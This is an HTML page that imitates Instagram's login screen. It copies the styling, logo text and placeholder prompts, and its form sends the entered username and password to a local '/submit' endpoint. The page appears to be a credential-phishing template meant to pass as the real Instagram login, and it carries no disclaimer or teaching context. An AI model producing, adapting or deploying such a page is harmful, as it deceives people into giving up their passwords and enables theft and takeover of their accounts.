<!doctype html>
<html><head><meta charset="utf-8"><title>Instagram</title>
<style>
body{background:#fafafa;font-family:Segoe UI,Roboto,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}
.card{background:#fff;border:1px solid #dbdbdb;padding:40px;width:350px;text-align:center;}
.logo{font-family:cursive;font-size:42px;margin-bottom:30px;color:#262626;}
input{width:100%;padding:10px;margin-bottom:6px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;box-sizing:border-box;font-size:14px;}
button{width:100%;padding:8px;background:#0095f6;color:#fff;border:none;border-radius:4px;cursor:pointer;font-weight:600;margin-top:8px;}
</style></head>
<body><div class="card"><div class="logo">Instagram</div>
<form method="POST" action="/submit">
<input type="text" name="username" placeholder="Phone number, username, or email" required autofocus>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form></div></body></html>
